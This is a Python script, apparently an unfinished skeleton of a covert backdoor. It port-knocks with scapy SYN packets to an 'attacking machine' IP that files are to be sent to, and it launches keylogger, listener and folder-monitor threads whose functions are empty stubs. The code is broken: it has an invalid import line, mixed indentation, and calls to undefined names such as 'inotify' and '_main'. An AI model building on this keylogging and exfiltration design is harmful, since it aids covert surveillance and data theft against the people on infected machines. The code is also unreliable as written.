#!/usr/bin/python

import sys
import time
import argparse
import os
from scapy.all import *
import threading
import re
from subprocess import Popen, PIPE
import array
import watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler


parser = argparse.ArgumentParser(description='Port Knocking Program')
parser.add_argument('-d', '--destination', dest='attackerIP', help="IP Address of attacking machine as you are sending files over", required=True)
#parser.add_argument('-s', '--sequencePorts', dest='sequencePorts', help="The sequence of ports you want to identify this pattern with. Example of 5 ports: 7005,7006,50000,2200,3000", required=True)
#parser.add_argument('-f', '--folder',dest='folder', help="What directory do you want to monitor? Example: /root/Document/<FolderName>", required=True)

args = parser.parse_args()
attackerIP = args.attackerIP
#sequencePorts = args.sequencePorts
#folder = args.folder

#seqPorts = [5]
#seqPorts = sequencePorts.split(",")
openPorts = [7005,7006,15000]

	
def port_knock(ports):
	global attackerIP
    print "[*] Knocking on ports "+str(ports)
    for dport in range(0, len(ports)):
        ip = IP(dst = attackerIP)
        SYN = ip/TCP(dport=ports[dport], flags="S", window=14600, options=[('MSS',1460)])
        send(SYN)

def execKnock(ports):
    port_knock(ports)
    print "Port opened"
    time.sleep(10)
    print "Port closed"
	
def keylogger():
	return

def listener():
	return

def folderMon():
	return

#main function
def main():
	execKnock(openPorts)
	#threads creation
	listenerThread = threading.Thread(target=listener)
    keylogThread = threading.Thread(target=keylogger)
    folderMon = threading.Thread(target=inotify)
    #
    listenerThread.daemon = True
    keylogThread.daemon = True
	folderMon.daemon = True
    #
    listenerThread.start()
    keylogThread.start()
	folderMon.start()

    #Keyboard Interrupt
    while True:
        try:
            time.sleep(5)
        except KeyboardInterrupt:
            reset()
            #print ("Exiting")
            sys.exit(0)

if __name__ == '__main__':
    _main()